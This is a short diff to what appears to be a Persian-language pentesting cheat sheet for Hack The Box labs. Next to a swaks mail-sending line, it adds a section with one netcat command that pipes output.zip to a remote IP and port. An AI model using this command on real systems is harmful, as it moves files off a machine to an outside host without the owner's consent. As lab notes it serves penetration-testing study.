@@ -784,3 +784,13 @@ https://htbmachines.github.io/
 swaks --to receiver@mail.dev --from from@mail.dev --server mail.server.dev --body "BODY" 
 ```
 
+
+## ارسال فایل جاری توسط nc 
+
+```text
+nc 10.10.10.10 3131 < output.zip
+```
+
+
+
+
